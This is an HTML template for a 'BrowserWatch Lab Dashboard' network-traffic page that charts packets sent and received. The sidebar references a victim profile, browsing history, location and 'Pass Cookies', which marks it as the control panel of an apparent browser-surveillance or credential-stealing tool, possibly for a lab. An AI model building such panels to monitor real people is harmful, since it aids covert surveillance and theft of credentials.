<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BrowserWatch Lab Dashboard</title>
    <link rel="stylesheet" href="/static/network.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
</head>
<body>
    <div class="container">
        <div class="sidebar">
            <div class="admin-profile">
                <div class="profile-image">
                    <img src="/static/image/victim-profile.png" alt="Admin Profile">
                </div>
                <h2>User 1</h2>
            </div>
            
            <nav class="sidebar-nav">
                <a class="nav-item" href="/overview">Overview</a>
                <a class="nav-item" href="/device">Device Info</a>
                <a class="nav-item" href="/history">History</a>
                <a class="nav-item active" href="/network">Network</a>
                <a class="nav-item" href="/location">Location</a>
                <a class="nav-item" href="/passcookies">Pass Cookies</a>
            </nav>
            
            <div class="logout-section">
                <a href="#" class="logout-btn">
                    <img src="/static/image/logout-icon.png" alt="Logout Icon" class="logout-icon">
                    Logout
                </a>
            </div>
        </div>        

        <main class="main-content">
            <div class="content-header">
                <h1 class="page-title">Network Traffic</h1>
            </div>
            <div class="chart-container">
                <canvas id="networkChart"></canvas>
            </div>
        </main>
    </div>

    <script>
        var networkData = JSON.parse('{{ network_data | tojson | safe }}');

        var labels = [];
        var packetsSent = [];
        var packetsReceived = [];

        networkData.forEach(function(item) {
            labels.push(item.created_at); 
            packetsSent.push(item.packets_sent); 
            packetsReceived.push(item.packets_recv); 
        });

        var ctx = document.getElementById('networkChart').getContext('2d');

        var networkChart = new Chart(ctx, {
            type: 'line',  
            data: {
                labels: labels, 
                datasets: [{
                    label: 'Packet Sent',
                    data: packetsSent,
                    borderColor: 'rgba(54, 162, 235, 1)', 
                    backgroundColor: 'rgba(54, 162, 235, 0.2)',
                    fill: true, 
                },
                {
                    label: 'Packet Received',
                    data: packetsReceived,
                    borderColor: 'rgba(153, 102, 255, 1)', 
                    backgroundColor: 'rgba(153, 102, 255, 0.2)',
                    fill: true, 
                }]
            },
            options: {
                scales: {
                    y: {
                        beginAtZero: true 
                    }
                },
                plugins: {
                    legend: {
                        position: 'top', 
                    },
                }
            }
        });
    </script>
</body>
</html>
